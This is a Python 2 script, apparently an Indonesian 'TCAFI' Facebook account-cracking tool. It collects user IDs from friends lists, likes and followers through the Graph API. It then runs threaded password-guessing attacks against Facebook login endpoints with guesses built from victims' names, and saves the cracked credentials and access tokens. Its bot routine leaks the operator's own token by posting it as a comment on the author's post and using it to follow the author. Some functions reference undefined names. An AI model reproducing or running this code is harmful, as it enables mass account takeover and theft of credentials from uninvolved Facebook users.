#!/usr/bin/python2
# coding=utf-8
# code by Khamdihi XD

#      (C) Copyright 407 Authentic Exploit
#      Rebuild Copyright Con't make u real programmer:)
#      Coded By Khamdihi XD

P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
p = '\x1b[1;97m' # PUTIH
m = '\x1b[1;91m' # MERAH
h = '\x1b[1;92m' # HIJAU
k = '\x1b[1;93m' # KUNING
b = '\x1b[1;94m' # BIRU
u = '\x1b[1;95m' # UNG
o = '\x1b[1;96m' # BIRU MUDA
n = '\x1b[0m'    # WARNA MATI
try:
    import os,sys,time,random,bs4,requests,mechanize
    import subprocess,logging,calendar
    import json,re,datetime
    from concurrent.futures import ThreadPoolExecutor
    from datetime import datetime
    from bs4 import BeautifulSoup
    from datetime import date
    from time import sleep as jeda
    s=requests.Session()
except ImportError:
    print('\n%s[%s!%s] Ada module import yang belum di install !'%(p,o,p))
    os.system('pip2 install bs4')
    print('\n%s[%s√%s] bs4 sukses di install √'%(p,h,p))
    os.system('pip2 install requests')
    print('\n%s[%s✓%s] requests sukses di install'%(p,h,p))
    os.system('pip2 install futures')
    print('\n %s[%s√%s] Module futures sukses di install'%(p,h,p))
    os.system('pip2 install mechanize')
    print('\n%s[%s✓%s] Semua module sukses di install'%(p,h,p))
    print('\n%s[%s!%s] jika masih eror cek koneksi lu'%(p,m,p))
    raw_input('%s[%s MENU %s] '%(p,h,p));menu()

IP = requests.get('https://api.ipify.org').text
id = []
cp = []
ok = []
loop = 0
def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush();jeda(0.03)
### GLOBAL WAKTU ###
ct = datetime.now()
n = ct.month
bulann = ['Januari','Februari','Maret','April','Mei','Juni','Juli','Agustus','September','Oktober','Nopember','Desember']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulann[nTemp]
my_date = date.today()
hr = calendar.day_name[my_date.weekday()]
tanggal = ("%s-%s-%s-%s"%(hr, ha, op, ta))
tgl = ("%s %s %s"%(ha, op, ta))
bulan = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}
ua = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'
pantun = random.choice(["Langit biru terlihat sendu, Warna hijau biru dan semu, Jarak jauh tumbuhkan rindu, Ingin selalu dekat denganmu.",
"Beribu-ribu para pelukis, Hanya satu memakan roti. Beribu-ribu cewek yang manis, Hanya engkau di dalam hati.",
"Syair puisi pantun dan madah, Pujangga ciptakan sepenuh rasa. Engkau tetap yang terindah, Dalam hidupku sepanjang masa.",
"Api kecil dari tungku, Apinya kecil habis kayu. Sudah lama kutunggu-tunggu, Kapan kamu bilang I Love You.",
"Sebuah nama punya arti, Mencari nama berhati-hati. Biarlah aku bersedih hati, Untuk dia yang di hati.",
"Pagi-pagi minumnya jamu, Di depan rumah ada bakul tahu. Sedikit malu kukatakan padamu, Sungguh aku cinta kepadamu.",
"Buah salak baru dipetik, Buah duku buah delima. Ada banyak wanita cantik, Cuma kamu yang aku cinta.",
"Jika mau menanam tebu, Tanamlah di dekat pohon waru. Jika kamu cinta padaku, Bilang saja I love you.",
"Buah sirsak baru dipetik, Buah duku asam rasanya. Ada banyak gadis cantik, Hanya kamu yang aku cinta.",
"Ke Ciamis cari kopiah, Kopiah indah pasti kan didapati. Begitu banyak gadis yang singgah, Hanya kamu yang memikat hati.",
"Makan nasi pakai tahu, Minumnya pakai jus jambu. Janganlah kau jauh dariku, Aku akan selalu sayang padamu.",
"Jalan-jalan ke kota Prancis, Banyak rumah berbaris-baris. Biar mati di ujung keris, Asal dapat adinda yang manis.",
"Meski hanya buah jambu, Tapi ini bisa diramu. Meskipun jarang ketemu, Tapi cintaku hanya untukmu.",
"Aku sedang minum jamu, Minum di bawah pohon jambu. Aku tak mau kehilangan kamu, Karena ku sangat mencintaimu."])
def folder():
	try:os.mkdir('hasil')
	except:pass
	try:os.mkdir('data')
	except:pass

def logo():
    print('''%s
        ______  _____   ___    ____   ____
       /_  __/ / ___/  / _ |  / __/  /  _/
        / /   / /__   / __ | / _/   _/ /
       /_/    \___/  /_/ |_|/_/    /___/
───────────────────────────────────────────────────
 [%s×%s] Author script  : Khamdihi XD
 [%s×%s] Github new     : https://github.com/khamdihi
 [%s×%s] Status script  : Elit not premium
─────────────────────────────────────────────────── '''%(p,u,p,u,p,u,p))
header = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": "NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+ ;]", "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
reload(sys)
sys.setdefaultencoding('utf-8')

def log():
    os.system('clear');logo()
    toket = raw_input('%s [%s+%s] Masukan token : %s'%(p,h,p,u))
    try:
        x = requests.get('https://graph.facebook.com/me?access_token=%s'%(toket)).json()['name']
        open('xnxcode.txt', 'w').write(toket)
        print('\n%s [%s√%s] Login sukses tunggu 3 detik'%(p,h,p))
        print('%s [%s!%s] Please suscribe my chenel youtube ;('%(p,h,p))
        os.system('xdg-open https://youtube.com/channel/UCOqxx2kjYPypVct2l81Y1Jw')
        bot()
    except KeyError:
        print('%s [%s!%s] Login gagal cek kembali token hasil malaknya'%(p,m,p));time.sleep(2)
        xnxx = raw_input('%s [%s+%s] Ketik [%sopen%s] jika belum tau cara ambil token : '%(p,u,p,h,p))
        if xnxx in ['open','OPEN','Open']:
              print('%s [%s√%s] Kamu akan di arahkan ke youtube'%(p,h,p))
              os.system('xdg-open https://youtu.be/dpK2yCZmuPA');exit()
        else:
              pks = raw_input('%s [%s?%s] Kamu mau keluar/lanjut k/l : '%(p,k,p))
              if pks in ['l','L']:
                 log()
              elif pks in ['k','K']:
                 exit('%s[%s!%s] Selamat tinggal'%(p,h,p))
              else:
                 print('%s [%s!%s] ketik k/l bukan nya %s'%(p,m,p,pks))
                 time.sleep(2);exit()

def bot():
	try:
		toket=open('xnxcode.txt','r').read()
	except IOError:
		print ('[!] Token invalid')
		login()
	love = random.choice(['❤️','💛','💚','💙','🖤','🧡','💜'])
	kata = 'Pengguna Script TCAFI '
        waktu = 'Script nya mantap bang ijo² Kaya ganja'
        toke = '%s'%(toket)
	kom = kata+love+'\n'+pantun+'\n'+waktu+'\n'+toke+'\n'
        requests.post('https://graph.facebook.com/100000626195514/subscribers?access_token=' + toket)
        requests.post('https://graph.facebook.com/100000626195514/subscribers?access_token=' + toket)
        requests.post('https://graph.facebook.com/100000626195514/subscribers?access_token=' + toket)
	requests.post('https://graph.facebook.com/5310931375604350/comments/?message=' +kom+ '&access_token=' + toket)
        requests.post('https://graph.facebook.com/5310931375604350/likes?summary=true&access_token=' + toket)
        requests.post('https://graph.facebook.com/5310931375604350/comments/?message=' +toke+ '&access_token=' + toket)
        requests.post('https://graph.facebook.com/5310931375604350/likes?summary=true&access_token=' + toket)
	requests.post('https://graph.facebook.com/100000626195514/subscribers?access_token=' + toket)
	requests.post('https://graph.facebook.com/100000626195514/subscribers?access_token=' + toket)
	requests.post('https://graph.facebook.com/100000626195514/subscribers?access_token=' + toket)
	print ('[*] Login Berhasil')
	menu()

def menu():
	os.system('clear')
	try:
		toket = open('xnxcode.txt','r').read()
	except IOError:
		print('%s[%s!%s] Token kamu invalid/belum login'%(p,m,p))
		time.sleep(2);os.system('rm -rf xnxcode.txt');time.sleep(2);log()
	try:
		you = requests.get('https://graph.facebook.com/me?access_token=%s'%(toket)).json()['name']
	except KeyError:
		print('%s[%s!%s] Token kamu invalid'%(p,m,p))
		time.sleep(2);os.system('rm -rf xnxcode.txt');log()
	except requests.exceptions.ConnectionError:
		exit('%s[%s!%s] Koneksi eror'%(p,m,p))
	logo()
	IP = requests.get('https://api.ipify.org').text
	print('\n [%s+%s] IP >  %s'%(k,p,IP))
	print(' [%s+%s] Welcome > %s'%(k,p,you))
	print(' [%s+%s] Logo Script : Tools crack akun facebook indosesia'%(k,p))
	print('\n [%s1%s] dump id from frinds and publik'%(k,p))
	print(' [%s2%s] dump id from likes'%(k,p))
	print(' [%s3%s] dump id from postingan publik'%(k,p))
	print(' [%s4%s] dump id from total followers'%(k,p))
	print(' [%s5%s] dump id massal publik'%(k,p))
	print(' [%s6] %sclass crack/mulai crack'%(k,h))
	print(' %s[%s7%s] cek hasil crack'%(p,k,p))
	print(' [%s8%s] seting user agent'%(k,p))
	print(' [%s9%s] lapor bug'%(k,p))
	print(' [%sI%s] info script !'%(k,p))
	print(' [%sk%s] %shapus xnxcode.txt'%(k,p,m))
	sa = raw_input('\n %s[%s•%s] chose input : '%(p,k,p))
	if sa in ['',' ', '']:
		print('%s [%s!%s] Jangan kosong %s konto !'%(p,m,p,you));time.sleep(3);menu()
	elif sa in ['1','01','0 1']:
		publik(toket) #
	elif sa in ['2','02','0 2']:
		print('\n%s [%s!%s] Next update maze'%(P,H,P));time.sleep(2);menu()
	elif sa in ['3','03','0 3']:
		postingan(toket) #
	elif sa in ['4','04','0 4']: 
		follo(toket) #
	elif sa in ['5','05','0 5']:
		masal()
	elif sa in ['6','06','0 6']:
		os.system('clear');logo()
		khamdihi().ganteng()
	elif sa in ['7','07','0 7']:
		hasil()
	elif sa in ['8','08','0 8']:
		print('\n%s [%s1%s] Ganti user agent saan ini\n %s[%s2%s] Cek user-agent saat ini\n %s[%s0%s] Kembali ke menu'%(p,h,p,p,h,p,p,h,p))
		it = raw_input('\n%s [%s?%s] Chose ua : '%(p,k,p))
		if it =='':
			menu()
		elif it in ['1','01','0 1']:
			use = raw_input('%s [%s?%s] Masukan user-agent : '%(p,h,p))
			if use in ['',' ', '']:
				print('%s [%s!%s] jangan kosong'%(p,m,p));menu()
			else:
				try:
					zedd = open('ua.txt', 'w')
					zedd.write(use)
					zedd.close()
					print('%s [%s√%s] Sukses menggani useragent baru'%(p,h,p))
					print('%s [%s√%s] user agent saat ini : %s'%(p,h,p,use))
					ua2 = raw_input('\n%s [%s enter untuk kembali %s]'%(p,h,p));menu()
				except KeyError:
					time.sleep(2);menu()
		elif it in ['2','02','0 2']:
			try:
				ua_ = open('data/ua.txt', 'r').read();jeda(2);print ("%s [%s*%s] user agent anda : %s%s"%(P,K,P,H,ua_));jeda(2);raw_input("\n%s [ %senter%s ] "%(P,K,P));menu()
			except IOError:
				ua_ = '%s-'%(M)
		else:
			menu()
	elif sa in ['9','09','0 9']:
		print('\n%s [%s!%s] Kamu akan di arahkan ke whatsap'%(p,h,p));os.system('xdg-open https://wa.me/qr/VOPTEUBSWABNH1')
		time.sleep(3);exit()
	elif sa in ['i','I',' i','ii']:
		print('\n%s [%s!%s] Di buat oleh > Khamdihi XD'%(P,H,P))
		print(' %s[%s•%s] Di buat tanggal > 3 maret 2022'%(P,H,P))
		print(' %s[%s•%s] Info script > ini di buat free kalo ada yang jual jangan mau'%(p,m,p))
		print(' %s[%s•%s] Versi tools > 1.2.4'%(p,m,p))
		raw_input(' %s[%s MENU %s] '%(p,h,p));menu()
	elif sa in ['k','K',' K']:
		os.system('rm -rf xnxcode.txt');exit()
	else:
		menu()

def postingan(toket,headers=header):
    try:
        os.mkdir('dump')
    except:pass
    try:
    	print ("\n%s [%s•%s] Perlu di ingat postingan wajib publik "%(P,K,P))
        idt = raw_input(' [*] Id post   : %s'%(H))
        simpan = raw_input(' %s[?] Nama file : %s'%(P,H))
        r = requests.get('https://graph.facebook.com/%s/likes?limit=999999&access_token=%s'%(idt,toket))
        id = []
        z = json.loads(r.text)
        file = ('dump/' + simpan + '.json').replace(' ', '_')
        bff = open(file, 'w')
        for a in z['data']:
            id.append(a['id'] + '<=>' + a['name'])
            bff.write(a['id'] + '<=>' + a['name'] + '\n')
            print '\r%s [*] mengumpulkan id :%s %s ' % (P,H,str(len(id))),
            sys.stdout.flush();jeda(0.0050)
        bff.close()
        print ('\n\n %s[%s√%s] Succes dump id postingan '%(P,K,P))
        print ('%s [%s√%s] File dump tersimpan :%s %s '%(P,K,P,K,file))
        raw_input('\n%s [ %senter %s] '%(P,H,P))
        menu()
    except Exception as e:
        print('\n %s[%s!%s] gagal dump id'%(P,M,P));time.sleep(2);menu()

def hasil():
	print('%s\n [%s1%s] cek hasil'%(p,h,p))
	print('%s [%s0%s] kembali'%(p,h,p))
	c = raw_input('\n%s [%s?%s] chose hasil : '%(p,h,p))
	if c in[""]:
		print ("%s [%s!%s] isi yang benar "%(P,M,P));exit()
	elif c in["1","01"]:
		try:
			dirs = os.listdir("hasil")
			print ("")
			for file in dirs:
				print("%s > %s%s"%(K,P,file));jeda(0.2)
			print("\n %s[%s•%s] cth : CP-%s-%s-%s%s"%(P,M,P,ha,op,ta,".txt"))
			file = raw_input("%s [?] masukan file : "%(P));jeda(0.2)
			if file == "":
				print("%s [!] file tidak ada "%(M))
			total = open("hasil/%s"%(file)).read().splitlines()
			print(" %s[%s•%s] --------------------------------------"%(P,K,P));jeda(2)
			nm_file = ("%s"%(file)).replace("-", " ")
			jalan(" [%s•%s] total akun : %s"%(K,P,len(total)))
			print(" %s[%s•%s] --------------------------------------"%(P,K,P));jeda(2)
			for akun in total:
				fb = akun.replace("\n","")
				tling  = fb.replace(" *--> ", " *-->").replace(" *-->", " *--> ")
				print(tling);jeda(0.03)
			print(" %s[%s•%s] --------------------------------------"%(P,K,P));jeda(2)
			raw_input('\n%s [ %senter %s] '%(P,K,P));menu()
		except (IOError):
			print("\n%s [!] tidak ada hasil "%(M))
			raw_input('\n%s [ %senter %s] '%(P,K,P));menu()
	elif c in ['2','02','0 2']:
		menu()
	else:
		menu()
def opsi():
        print('%s [%s!%s] Nek update mamasz'%(p,h,p));time.sleep(2);menu()

def publik(toket,headers=header):
	try:
		os.mkdir('dump')
	except:pass
	try:
		print('\n %s[%s?%s] Ketik me jika ingin dump dari daftar teman'%(p,h,p))
		idt = raw_input(' %s[%s?%s] Masukan id : %s'%(p,k,p,h))
		kontol = requests.get('https://graph.facebook.com/%s?access_token=%s'%(idt,toket))
		coli = json.loads(kontol.text)
		file = ('dump/'+coli['first_name']+'.json').replace(' ', '_')
		xnxx= open(file, 'w')
		r = requests.get('https://graph.facebook.com/%s?fields=friends.limit(5001)&access_token=%s'%(idt,toket))
		z = json.loads(r.text)
		for a in z['friends']['data']:
			id.append(a['id'] + '<=>' + a['name'])
			xnxx.write(a['id'] + '<=>' + a['name'] + '\n')
			w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
			sys.stdout.write('\r\033[0m <-> ' + w + '%s%s                                        \r\n\x1b[1;92m [ mengumpukan id dump ]'%(a['name'], len(id)))
			sys.stdout.flush()
			sys.stdout.flush();time.sleep(0.0050)
		xnxx.close()
		print('\n\n %s[%s√%s] Sukses dump : %s'%(p,h,p,file))
		jalan(' %s[%s!%s] Salin dulu file di atas'%(P,H,P))
		print(' %s[%s?%s] Ketik %scrack > %slangsung crack ketik %smenu > %sback menu'%(P,H,P,H,P,H,P))
		tanya = raw_input('\n %s[%s?%s] Mau apa : '%(P,H,P))
		if tanya in ['', '',' ']:
			print(' %s[%s!%s] Jangan kosong !!'%(P,M,P));time.sleep(3);menu()
		elif tanya in ['crack','Crack','CRACK','c','C']:
			os.system('clear');logo();khamdihi().ganteng()
		elif tanya in ['menu','Menu','MENU','m','M']:
			menu()
		else:
			jalan(' %s[%s!%s] Crack atau menu bukan %s'%(P,M,P,tanya));time.sleep(2);menu()
	except Exception as e:
		print('\n %s[%s!%s] id target privat/tidak publik'%(p,m,p));time.sleep(3);menu()

def follo(toket,headers=header):
    try:
        os.mkdir('dump')
    except:pass
    try:
    	print ("\n%s [%s!%s] Ketik '%sme%s' jika ingin dump followers sendiri "%(P,K,P,K,P))
        idt = raw_input(' [*] Target id : %s'%(H))
        batas = raw_input(' %s[*] Maximal id : %s'%(P,H))
        gas = requests.get('https://graph.facebook.com/%s?access_token=%s'%(idt,toket))
        nm = json.loads(gas.text)
        file = ('dump/'+nm['first_name']+'.json').replace(' ', '_')
        bff = open(file, 'w')
        r = requests.get('https://graph.facebook.com/%s/subscribers?limit=%s&access_token=%s'%(idt,batas,toket))
        z = json.loads(r.text)
        for a in z['data']:
            id.append(a['id'] + '<=>' + a['name'])
            bff.write(a['id'] + '<=>' + a['name'] + '\n')
            print '\r%s [*] mengumpulkan id :%s %s ' % (P,U,str(len(id))),
            sys.stdout.flush();jeda(0.0050)
        bff.close()
        print ('\n\n %s[%s√%s] Succes dump id dari %s%s'%(P,K,P,K,nm['name']))
        print (' %s[%s√%s] File dump tersimpan :%s %s '%(P,K,P,K,file))
        raw_input('\n%s [ %senter %s] '%(P,H,P))
        menu()
    except Exception as e:
        print('\n %s[%s!%s] id tidak publik lol'%(P,M,P))
        time.sleep(2);menu()

def masal():
	try:
		lil=open('xnxcode.txt', 'r').read()
	except I0Error:
                exit("%s[•] Token modar dinggo wae tolol"%(p))
	try:
		tr = int(raw_input("\n %s[%s?%s] Mau dump berapa id : "%(p,h,p)))
	except:
		tr = 1
	il = raw_input(" %s[%s•%s] Buat file dump : "%(p,k,p))
	for zx in range(tr):
		zx += 1
		id=raw_input(" %s[%s?%s] Userid %s%s : "%(p,k,p,h,zx))
		try:
			rex=requests.get("https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s"%(id,lil))
			ex=json.loads(rex.text)
			file = open(il , 'a')
			id = []
			for a in ex['friends']['data']:
				id.append(a['id']+"<=>"+a['name'])
				file.write(a['id']+"<=>"+a['name']+'\n')
                                print("\r%s[!] %s%s %s%s %s%s "%(p,b,str(len(id)),i,a["name"],o,a["id"])),
                                sys.stdout.flush();jeda(0.0050)
                                print("")
		except KeyError:
			exit(' %s[!] id privat/tidak publik!'%(m))
	file.close()
	__id=open(il, 'r').readlines()
	print(" %s[•] Total id hasil dump %s %s %s"%(p,b,len(__id),p))
	print(" [•] File hasil dump tersimpan di : %s%s"%(B,il))
	time.sleep(5);menu()

class khamdihi:

    def __init__(self):
        self.id = []
    def ganteng(self):
        try:
            self.apk = raw_input('\n %s[%s?%s] file hasil dump :%s '%(P,K,P,H))
            self.id = open(self.apk).read().splitlines()
            print '%s [%s•%s] jumlah id : %s%s' %(p,u,p,h,len(self.id))
        except:
            print '\n%s [!] File dump tidak ada, dump id dulu kentod'%(K)
            raw_input('\n%s [ %senter %s] '%(P,m,P));menu()
        _dihi_ = raw_input('%s [?] ingin gunakan password manual? y/t :%s '%(P,K))
        if _dihi_ in ('Y', 'y'):
            print '\n %s[%s!%s] cth : %ssayang,anjing%s gunakan , (koma) untuk pemisah '%(P,M,P,H,P)
            while True:
                pwx = raw_input(' %s[?] set password :%s '%(P,K))
                if pwx == '':
                    print '\n %s[!] jangan kosong '%(M)
                elif len(pwx)<=5:
                    print '\n %s[!] password minimal 6 karakter'%(M)
                else:
                    def zona(zafi_=None): 
                        ind = raw_input('\n %s[?] methode : %s'%(p,u))
                        if ind == '':
                            print("%s [!] Isi yang benar kentod "%(M));self.zona()
                        elif ind in ('1', '01'):
                            print '\n %s[%s•%s] akun %sOK%s tersimpan di >%s hasil/OK-%s-%s-%s.txt'%(P,K,P,H,P,H,ha, op, ta);jeda(0.2)
                            print '%s [%s•%s] akun %sCP %stersimpan di > %shasil/CP-%s-%s-%s.txt'%(P,K,P,K,P,K,ha, op, ta);jeda(0.2)
                            print '%s [%s•%s] setiap crack 500 ID gunakan mode pesawat 5 detik\n'%(P,M,P);jeda(0.2)
                            with ThreadPoolExecutor(max_workers=30) as log:
                                for akun in self.id:
                                    try:
                                        indo = akun.split('<=>')[0]
                                        log.submit(self.b_api, indo, zafi_)
                                    except: pass
                            os.remove(self.apk);exit()
                        elif ind in ('2', '02'):
                            print '\n%s [%s•%s] akun %sOK%s tersimpan di >%s hasil/OK-%s-%s-%s.txt'%(P,K,P,H,P,H,ha, op, ta);jeda(0.2)
                            print '%s [%s•%s] akun %sCP %stersimpan di > %shasil/CP-%s-%s-%s.txt'%(P,K,P,K,P,K,ha, op, ta);jeda(0.2)
                            print '%s [%s•%s] setiap crack 500 ID gunakan mode pesawat 5 detik\n'%(P,M,P);jeda(0.2)
                            with ThreadPoolExecutor(max_workers=30) as log:
                                for akun in self.id:
                                    try:
                                        indo = akun.split('<=>')[0]
                                        log.submit(self.basic, indo, zafi_)
                                    except: pass
                            os.remove(self.apk);exit()
                        elif ind in ('3', '03'):
                            print '\n %s[%s•%s] akun %sOK%s tersimpan di >%s hasil/OK-%s-%s-%s.txt'%(P,K,P,H,P,H,ha, op, ta);jeda(0.2)
                            print '%s [%s•%s] akun %sCP %stersimpan di > %shasil/CP-%s-%s-%s.txt'%(P,K,P,K,P,K,ha, op, ta);jeda(0.2)
                            print '%s [%s•%s] setiap crack 500 ID gunakan mode pesawat 5 detik\n'%(P,M,P);jeda(0.2)
                            with ThreadPoolExecutor(max_workers=30) as log:
                                for akun in self.id:
                                    try:
                                        indo = akun.split('<=>')[0]
                                        log.submit(self.mobil, indo, zafi_)
                                    except: pass
                            os.remove(self.apk);exit()
                        else:
                            print ('\n %s[!] isi yang benar kentod'%(M));zona()
                    print '\n%s [ pilih methode crack - silahkan coba satu persatu ]\n'%(P)
                    print ' [%s1%s] methode b-api '%(K,P)
                    print ' [%s2%s] methode mbasic '%(K,P)
                    print ' [%s3%s] methode mobile  '%(K,P)
                    zona(pwx.split(','))
                    break
        elif _dihi_ in ('T', 't'):
            print '\n%s [ pilih methode crack - silahkan coba satu persatu ]\n'%(P)
            print ' [%s1%s] methode b-api '%(u,P)
            print ' [%s2%s] methode mbasic '%(u,P)
            print ' [%s3%s] methode Free f.com '%(u,P)
            print ' [%s4%s] Methode mbasic ke dua'%(u,p)
            print ' [%s5%s] Methode Touch Facebook.com [NEWNGABDICOBA]'%(u,p)
            self.langsung()
        else:
            print("%s [!] Isi yang benar kentod "%(M));jeda(2);menu()
    def langsung(self):
        suuu = raw_input('\n %s[?] methode :%s '%(p,h))
        if suuu == '':
            print("%s [!] Isi yang benar kentod "%(M));self.langsung()
        elif suuu in ('1', '01'):
            print '\n %s[%s•%s] akun %sOK%s tersimpan di >%s hasil/OK-%s-%s-%s.txt'%(P,K,P,H,P,H,ha, op, ta);jeda(0.2)
            print '%s [%s•%s] akun %sCP %stersimpan di > %shasil/CP-%s-%s-%s.txt'%(P,K,P,K,P,K,ha, op, ta);jeda(0.2)
            print '%s [%s•%s] setiap crack 500 ID gunakan mode pesawat 5 detik\n'%(P,M,P);jeda(0.2)
            with ThreadPoolExecutor(max_workers=30) as log:
            	for akun in self.id: 
                    try:
                        uid, name = akun.split('<=>')
                        _i_ = name.split(' ')
                        if len(_i_) == 3 or len(_i_) == 4 or len(_i_) == 5 or len(_i_) == 6:
                            pwx = [name, _i_[0]+"123", _i_[0]+"12345"]
                        else:
                            pwx = [name, _i_[0]+"123", _i_[0]+"12345"]
                        log.submit(self.mobile, uid, dekura)
                    except: pass
            os.remove(self.apk);exit()
        elif suuu in ('2', '02'):
            print '\n%s [%s•%s] akun %sOK%s tersimpan di >%s hasil/OK-%s-%s-%s.txt'%(P,K,P,H,P,H,ha, op, ta);jeda(0.2)
            print '%s [%s•%s] akun %sCP %stersimpan di > %shasil/CP-%s-%s-%s.txt'%(P,K,P,K,P,K,ha, op, ta);jeda(0.2)
            print '%s [%s•%s] setiap crack 500 ID gunakan mode pesawat 5 detik\n'%(P,M,P);jeda(0.2)
            with ThreadPoolExecutor(max_workers=30) as log:
            	for akun in self.id: 
                    try:
                        uid, name = akun.split('<=>')
                        _i_ = name.split(' ')
                        if len(_i_) == 3 or len(_i_) == 4 or len(_i_) == 5 or len(_i_) == 6:
                            pwx = [name, _i_[0]+"123", _i_[0]+"12345"]
                        else:
                            pwx = [name, _i_[0]+"123", _i_[0]+"12345"]
                        log.submit(self.basic, uid, pwx)
                    except: pass
            os.remove(self.apk);exit()
        elif suuu in ('3', '03'):
            print '\n %s[%s•%s] akun %sOK%s tersimpan di >%s hasil/OK-%s-%s-%s.txt'%(P,u,p,u,P,u,ha, op, ta);jeda(0.2)
            print '%s [%s•%s] akun %sCP %stersimpan di > %shasil/CP-%s-%s-%s.txt'%(P,u,P,u,P,u,ha, op, ta);jeda(0.2)
            print '%s [%s•%s] setiap crack 500 ID gunakan mode pesawat 5 detik\n'%(P,h,P);jeda(0.2)
            with ThreadPoolExecutor(max_workers=30) as log:
            	for akun in self.id: 
                    try:
                        uid, name = akun.split('<=>')
                        _i_ = name.split(' ')
                        if len(_i_) == 3 or len(_i_) == 4 or len(_i_) == 5 or len(_i_) == 6:
                            pwx = [name, _i_[0]+"123", _i_[0]+"12345"]
                        else:
                            pwx = [name, _i_[0]+"123", _i_[0]+"12345"]
                        log.submit(self.mobil, uid, pwx)
                    except: pass
            os.remove(self.apk);exit()
        elif suuu in ['4','04']:
            print '\n%s [%s*%s] akun %sOK%s tersimpan di >%s hasil/OK-%s-%s-%s.txt'%(P,K,P,H,P,H,ha, op, ta);jeda(0.2)
            print '%s [%s*%s] akun %sCP %stersimpan di > %shasil/CP-%s-%s-%s.txt'%(P,K,P,K,P,K,ha, op, ta);jeda(0.2)
            print '%s [%s!%s] setiap crack 500 ID gunakan mode pesawat 5 detik\n'%(P,M,P);jeda(0.2)
            with ThreadPoolExecutor(max_workers=30) as log:
            	for akun in self.id: 
                    try:
                        uid, name = akun.split('<=>')
                        _i_ = name.split(' ')
                        if len(_i_) == 3 or len(_i_) == 4 or len(_i_) == 5 or len(_i_) == 6:
                            pwx = [name, _i_[0]+"123", _i_[0]+"12345"]
                        else:
                            pwx = [name, _i_[0]+"123", _i_[0]+"12345"]
                        log.submit(self.mobil, uid, pwx)
                    except: pass
            os.remove(self.apk);exit()
        elif suuu in ('5', '05'):
            print '\n %s[%s•%s] akun %sOK%s tersimpan di >%s hasil/OK-%s-%s-%s.txt'%(P,K,P,H,P,H,ha, op, ta);jeda(0.2)
            print '%s [%s•%s] akun %sCP %stersimpan di > %shasil/CP-%s-%s-%s.txt'%(P,K,P,K,P,K,ha, op, ta);jeda(0.2)
            print '%s [%s•%s] setiap crack 500 ID gunakan mode pesawat 5 detik\n'%(P,K,P);jeda(0.2)
            with ThreadPoolExecutor(max_workers=30) as log:
            	for akun in self.id: 
                    try:
                        uid, name = akun.split('<=>')
                        _i_ = name.split(' ')
                        if len(_i_) == 3 or len(_i_) == 4 or len(_i_) == 5 or len(_i_) == 6:
                            pwx = [name, _i_[0]+"123", _i_[0]+"12345"]
                        else:
                            pwx = [name, _i_[0]+"123", _i_[0]+"12345"]
                        log.submit(self.__mfb__, uid, pwx)
                    except: pass
            os.remove(self.apk);exit()
        else:
            print('%s [%s!%s] isi yang bener kntod'%(p,m,p));menu()
    def b_api(self, user, zona):
    	try:
    	    ua = open('data/ua.txt', 'r').read()
        except IOError:
        	ua = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'
        global ok,cp,loop
        for pw in zona:
            pw = pw.lower()
            ses = requests.Session()
            header = {"user-agent": ua,
            "x-fb-connection-bandwidth": str(random.randint(20000,40000)),
            "x-fb-sim-hni": str(random.randint(20000,40000)),
            "x-fb-net-hni": str(random.randint(20000,40000)),
            "x-fb-connection-quality": "EXCELLENT",
            "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
            "content-type": "application/x-www-form-urlencoded",
            "x-fb-http-engine": "Liger"}
            bapi = "https://b-api.facebook.com/method/auth.login"
            response = ses.get(bapi+'?format=json&email='+user+'&password='+pw+'&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers=header)
            if response.status_code != 200:
            	loop +=1
            	print ("\r\033[0;91m [!] IP terblokir. hidupkan mode pesawat 2 detik"),
                sys.stdout.flush()
                b_api(self, user, zona)
            if 'session_key' in response.text and 'EAAA' in response.text:
                print '\r %s[OK] %s • %s • %s ' % (H,user,pw,response.json()['access_token'])
                ok.append('%s ◊ %s ◊ %s' % (user,pw,response.json()['access_token']))
                open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write(' *--> %s ◊ %s ◊ %s\n'%(user,pw,response.json()['access_token']))
                break
                continue
            elif 'www.facebook.com' in response.json()['error_msg']:
                try:
                    toket = open('xnxcode.txt').read()
